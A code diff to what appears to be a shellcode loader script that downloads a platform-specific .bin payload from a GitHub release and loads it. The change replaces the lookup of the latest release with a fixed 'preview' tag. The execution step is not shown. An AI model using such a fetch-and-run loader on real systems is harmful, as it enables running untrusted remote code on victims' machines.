@@ -9,7 +9,7 @@ Usage:
     # Local file (requires --arch):
     python loader.py --arch x86_64 output.bin
 
-    # Remote (auto-detects platform):
+    # Remote (auto-detects platform, defaults to preview tag):
     python loader.py
     python loader.py --tag v0.0.1-alpha.1
 
@@ -151,23 +151,13 @@ def _http_get(url):
         return resp.read()
 
 
-def _find_latest_tag():
-    url = "https://api.github.com/repos/%s/releases?per_page=1" % REPO
-    req = urllib.request.Request(url, headers={
-        "User-Agent": "PIA-Loader/1.0",
-        "Accept": "application/vnd.github+json",
-    })
-    with urllib.request.urlopen(req, context=_ssl_context()) as resp:
-        releases = json.loads(resp.read())
-    if not releases:
-        sys.exit("[-] No releases found")
-    return releases[0]["tag_name"]
+DEFAULT_TAG = "preview"
 
 
 def download(platform_name, arch, tag):
     if not tag:
-        tag = _find_latest_tag()
-        print("[+] Latest release: %s" % tag)
+        tag = DEFAULT_TAG
+        print("[+] Using tag: %s" % tag)
 
     asset = "%s-%s.bin" % (platform_name, arch)
     url = "https://github.com/%s/releases/download/%s/%s" % (REPO, tag, asset)
@@ -424,7 +414,7 @@ def main():
     parser.add_argument('--arch', choices=list(ARCH.keys()),
                         help='Target architecture (required for local files, optional for remote)')
     parser.add_argument('--tag', default=None,
-                        help='GitHub release tag (default: latest). Enables remote mode.')
+                        help='GitHub release tag (default: preview). Enables remote mode.')
     parser.add_argument('shellcode', nargs='?', default=None,
                         help='Path to shellcode .bin file (omit to download from GitHub)')
     args = parser.parse_args()
@@ -465,7 +455,7 @@ def main():
         if args.arch:
             arch = args.arch
         print("[*] Platform: %s/%s" % (plat, arch))
-        print("[*] Release: %s" % (args.tag or 'latest'))
+        print("[*] Release: %s" % (args.tag or DEFAULT_TAG))
 
         shellcode = download(plat, arch, args.tag)
         print("[+] Loaded: %d bytes" % len(shellcode))
